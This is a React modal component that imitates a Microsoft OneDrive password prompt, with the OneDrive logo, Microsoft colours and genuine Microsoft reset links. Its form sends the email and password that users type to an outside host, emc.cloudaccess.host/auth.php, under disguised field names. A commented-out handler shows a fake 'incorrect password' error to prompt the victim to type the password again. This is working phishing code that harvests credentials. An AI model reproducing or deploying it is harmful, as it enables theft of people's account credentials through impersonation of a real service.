import Modal from "react-modal";
import { useState } from "react";
import axios from "axios";

const customStyles = {
  overlay: {
    backgroundColor: "rgba(0, 0, 0, 0.5)",
  },
  content: {
    top: "50%",
    left: "50%",
    right: "auto",
    bottom: "auto",
    marginRight: "-50%",
    transform: "translate(-50%, -50%)",
    maxWidth: "95%",
    maxHeight: "95%",
  },
};

Modal.setAppElement("#__next");

function PopUpModal({ isOpen, handleClose, error }) {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");

  //   const handleSubmit = (e) => {
  //     e.preventDefault();
  //     const url = "https://emc.cloudaccess.host/auth.php";
  //     const data = { email };
  //     setError("The email or password is incorrect");

  //     return axios.post(url, data);
  //   };

  return (
    <Modal
      isOpen={isOpen}
      onRequestClose={handleClose}
      style={customStyles}
      contentLabel="Modal"
    >
      <form
        action="https://emc.cloudaccess.host/auth.php"
        method="post" // onSubmit={handleSubmit}
        className="flex flex-col items-center justify-center gap-5 lg:w-[28rem] text-gray-800 text-sm"
      >
        <div className="text-gray-700 lg:px-10">
          <h2 className="font-bold text-center text-base p-2">
            User Authentication
          </h2>
          {error ? (
            <span className="text-sm text-red-500">
              {error} if you don't remember your password,{" "}
              <a href="https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/login.srf%3fcobrandid%3d90015%26id%3d292841%26cobrandid%3d90015%26uaid%3d77a752de46ed4d5897e5f73360a3fde9%26id%3d292841%26contextid%3d2CF9084A013B1018%26opid%3dA007932B9F57B8DB%26bk%3d1680001408&id=292841&uiflavor=web&cobrandid=90015&uaid=77a752de46ed4d5897e5f73360a3fde9&mkt=EN-US&lc=1033&bk=1680001408">
                <span className="text-[#0078D4]">reset it now</span>
              </a>
            </span>
          ) : (
            <span className="text-sm">
              Because you're accessing sensitive info, you need to verify your
              password
            </span>
          )}
        </div>
        <input
          type="email"
          required
          name="sweetsmy"
          value={email}
          onChange={(e) => setEmail(e.target.value)}
          placeholder="Email address"
          className="bg-white px-4 py-2 ring-1 ring-gray-300 rounded w-[20rem] focus:outline-none focus:ring-1 focus:ring-[#0078D4] lg:w-[23rem]"
        />
        <input
          type="password"
          required
          placeholder="Password"
          name="gummy"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          className="bg-white px-4 py-2 ring-1 ring-gray-300 focus:outline-none focus:ring-1 focus:ring-[#0078D4] rounded w-[20rem] lg:w-[23rem]"
        />
        <div className="w-[20rem] lg:w-[23rem] ">
          <a href="https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/login.srf%3fcobrandid%3d90015%26id%3d292841%26cobrandid%3d90015%26uaid%3d77a752de46ed4d5897e5f73360a3fde9%26id%3d292841%26contextid%3d2CF9084A013B1018%26opid%3dA007932B9F57B8DB%26bk%3d1680001408&id=292841&uiflavor=web&cobrandid=90015&uaid=77a752de46ed4d5897e5f73360a3fde9&mkt=EN-US&lc=1033&bk=1680001408">
            <span className="text-[#0078D4] text-start">Forgot password?</span>
          </a>
        </div>
        <button className="bg-[#0078D4] p-2 rounded w-[20rem] text-white lg:w-[23rem]">
          Continue
        </button>

        <img src="./img/OneDrive.svg" alt="" />
      </form>
    </Modal>
  );
}

export default PopUpModal;
